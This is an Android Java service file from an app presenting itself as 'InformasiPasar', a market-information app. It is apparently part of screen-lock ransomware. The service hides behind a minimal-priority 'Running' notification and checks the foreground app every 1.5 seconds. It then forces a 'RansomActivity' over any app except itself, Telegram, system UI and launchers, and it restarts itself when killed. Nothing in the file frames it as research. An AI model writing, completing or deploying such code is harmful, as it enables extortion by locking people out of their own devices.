package com.informasipasar.app;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.util.List;
import java.util.SortedMap;
import java.util.TreeMap;

public class RedirectService extends Service {

    private static final String CH = "redirect_channel";
    private static final String WHITELIST = "com.telegram.messenger";
    private static final String SELF = "com.informasipasar.app";
    private Handler handler;
    private Runnable loop;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(3, baseNotif());
        handler = new Handler(Looper.getMainLooper());
        loop = new Runnable() {
            @Override public void run() {
                checkForeground();
                handler.postDelayed(this, 1500);
            }
        };
        handler.post(loop);
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "Redirect", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification baseNotif() {
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("InformasiPasar")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    private void checkForeground() {
        try {
            String pkg = currentForeground();
            if (pkg == null) return;
            if (pkg.equals(SELF)) return;
            if (pkg.equals(WHITELIST)) return;
            // jangan trigger untuk system UI / launcher
            if (pkg.startsWith("com.android.systemui")) return;
            if (pkg.contains("launcher")) return;

            Intent i = new Intent(this, RansomActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(i);
        } catch (Exception ignored) {}
    }

    private String currentForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            if (usm == null) return null;
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                    UsageStatsManager.INTERVAL_DAILY, now - 1000 * 60, now);
            if (stats != null && !stats.isEmpty()) {
                SortedMap<Long, UsageStats> map = new TreeMap<>();
                for (UsageStats s : stats) map.put(s.getLastTimeUsed(), s);
                if (!map.isEmpty()) return map.get(map.lastKey()).getPackageName();
            }
        }
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (am != null) {
            List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            if (procs != null) {
                for (ActivityManager.RunningAppProcessInfo p : procs) {
                    if (p.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                        return p.processName;
                    }
                }
            }
        }
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
